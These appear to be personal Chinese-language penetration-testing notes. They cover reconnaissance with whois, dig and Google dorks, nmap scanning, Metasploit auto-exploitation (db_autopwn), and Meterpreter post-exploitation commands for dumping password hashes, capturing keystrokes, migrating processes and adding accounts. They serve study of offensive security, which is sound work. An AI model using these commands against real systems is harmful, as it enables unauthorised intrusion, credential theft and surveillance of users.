

### 踩点

#### 根据域名查询

**查注册信息** 

```shell
#命令
whois baidu.com
```

搜索引擎查**备案信息** 

[根据备案信息去工信部查关联信息]

**查ip** 

```sh
#nslookup 命令
nslookup baidu.com
#host命令查
host baidu.com
#dig命令查
dig 8.8.8.8 baidu.com	#指定某dns服务器帮助查询
```

**根据ip查地理位置 ** 

示例查询网址：[ip.cn](https://ip.cn)  



#### 根据ip查询

**查域名** **及子域名** 



### 搜索引擎踩点

**google hacking，shodan** 

查找目录，后缀文件，查找开放端口等

```sh
#google搜索示例
site:51cto.com filetype:doc	#后缀doc文件
#查看站点目录
parent directory site:51cto.com
#含有关键字的url页面
site:51cto.com inurl:login
#含有关键字的页面文本
site:51cto.com intext:login
```



### 拓扑路径踩点

```sh
#linux
traceroute xxx.com	#(ICMP)
tcptraceroute xxx.com 	#(TCP)
#windows
tracert  xxx.com
```



### 扫描

#### 主机扫描

```
传统ICMP Ping扫描
ACK Ping扫描
SYN Ping扫描
UDP Ping扫描
#工具
Nmap	#集成了上述扫描方式，万能扫描器
```

#### 端口扫描

```
TCP连接扫描
SYN扫描
UDP扫描
#工具
Nmap
```

#### 系统扫描

```
探查主机的操作系统类型
 --原理：根据返回的数据包中的不同的特征码判断
 nmap -O
开放端口监听的网络服务
 nmap -sV
```

#### 漏洞扫描

```sh
#工具 (含大多数漏洞的攻击代码)
Nessus 		（kali不自带）
OpenVAS 	#Nessus开源版（kali不自带）
```

#### nmap命令

```sh
nmap -sS -Pn x.x.x.x	#扫描ip，系统端口服务信息
nmap -sV -Pn x.x.x.x	#扫描版本信息
nmap -A x.x.x.x			#综合扫描（数据多，耗时长）
```



kali图形扫描器

```
autoscan
zenmap
```



Nessus安装 



#### 扫描端口是否开启

```sh
#telnet
telnet ip port
#curl
curl ip:port
#nmap
nmap -p port ip
```

### 查点

针对可能漏洞，具体探查

比如弱口令漏洞，使用口令猜解

暴力破解工具，加载词典

```
metasploit相关模块
```



kali渗透平台：
metasploit

google浏览器插件：
sodan
翻墙
postman
...

### 自动渗透

kali进入metasploit控制台

```sh
#扫描ip，将扫描的内容存储到数据库
msf> db_nmap -T aggressive -sV -n -O -V 10.10.10.130	
-T aggressive ：采用最快的时间扫描
-sV ：判断提供的服务和软件版本
-n ：不做dns解析，提高速度
-O ：判断操作系统
-v ：显示扫描结果

#查看扫描到的主机
msf> hosts

#扫描到的服务
msf> services

#自动攻击，加载攻击模块针对服务漏洞进行攻击，此命令在新版kali已删除
msf> db_autopwn -t -p -e -i 10.10.10.130
-t ：显示所有模块
-p ：加载模块攻击
-e ：执行攻击
-i ：指定扫描到的主机


```

### 后渗透

通过meterpreter管理控制渗透成功后和目标系统的连接

```sh
#常见命令
getuid 		#查看当前用户，（攻击机权限）
sysinfo 	#查看系统信息
run hashdump	#备份系统账户哈希值，后续可爆破
ps			#查看进程
migrate xxxx	#迁移进程，（迁移到系统进程/管理员进程，即使对方关闭漏洞进程也无济于事）
keyscan_start	#抓取键盘操作
keyscan_dump	#显示键盘操作
keyscan_stop
run getui -e	#开启远程桌面
run getui -u pinginglab -p cisco #添加账号密码

```



linux远程登陆

```sh
rdesktop x.x.x.x
```



使用LC5容笑汉化版，windows下破解账户hash

可百度下载

